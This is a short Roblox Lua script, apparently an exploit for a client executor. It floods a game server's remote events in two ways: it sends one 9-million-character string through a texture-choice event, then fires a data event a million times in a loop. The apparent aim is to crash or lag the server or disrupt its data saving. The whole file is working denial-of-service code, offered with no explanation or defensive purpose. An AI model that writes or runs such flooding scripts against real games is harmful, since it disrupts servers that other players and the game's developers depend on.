local RS = game:GetService("ReplicatedStorage")


RS.DataEvents.UpdateTexturesChoice:FireServer(string.rep("A", 9e6))


local DataRemote = RS.DataEvents.DataRemoteEvent
for i = 1, 1e6 do
    DataRemote:FireServer()
end
